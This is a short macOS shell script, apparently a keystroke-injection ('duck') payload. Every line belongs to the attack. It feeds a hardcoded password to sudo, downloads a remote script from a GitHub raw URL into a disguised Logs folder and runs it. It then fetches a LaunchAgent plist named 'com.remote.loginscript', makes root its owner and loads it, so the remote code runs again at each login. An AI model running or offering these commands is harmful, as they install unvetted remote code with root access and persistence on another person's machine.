echo facu14y | sudo -S curl -o ~/Library/Logs/process.sh https://raw.githubusercontent.com/sudoday/project-duck/master/process.sh
echo facu14y | sudo -S chmod +x ~/Library/Logs/process.sh
/Library/Logs/process.sh
echo facu14y | sudo -S  curl -o ~/Library/LaunchAgents/com.remote.loginscript.plist https://raw.githubusercontent.com/sudoday/project-duck/master/plist
echo facu14y | sudo -S chown root:wheel ~/Library/LaunchAgents/com.remote.loginscript.plist
launchctl load ~/Library/LaunchAgents/com.remote.loginscript.plist
